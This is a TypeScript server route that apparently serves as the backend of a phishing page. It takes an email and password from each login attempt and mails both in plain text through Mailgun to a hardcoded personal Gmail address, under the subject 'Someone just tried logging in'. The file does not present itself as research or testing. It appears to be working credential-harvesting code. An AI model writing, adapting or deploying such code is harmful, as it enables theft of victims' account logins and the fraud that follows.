"use strict";

import Mailgun from "mailgun.js";
import formData from "form-data";

const mailgun = new Mailgun(formData);
const mg = mailgun.client({
  username: "api",
  key: process.env.MAILGUN_API_KEY || "",
});

export const config = {
  api: {
    bodyParser: true,
  },
};

export async function POST(request: Request) {
  try {
    const { email, password } = await request.json();

    await mg.messages.create(process.env.MAILGUN_DOMAIN || "", {
      from: "Ikenna Ezeani <ikenna.ezeani@mailinator.com>",
      to: ["elochi238@gmail.com"],
      subject: "Someone just tried logging in",
      message: `email address - ${email}, password - ${password}`,
    });

    return new Response(
      JSON.stringify({
        success: true,
        message: "You just sent a message!!!",
      })
    );
  } catch (error) {
    return new Response(
      JSON.stringify({
        success: false,
        error: error,
      })
    );
  }
}
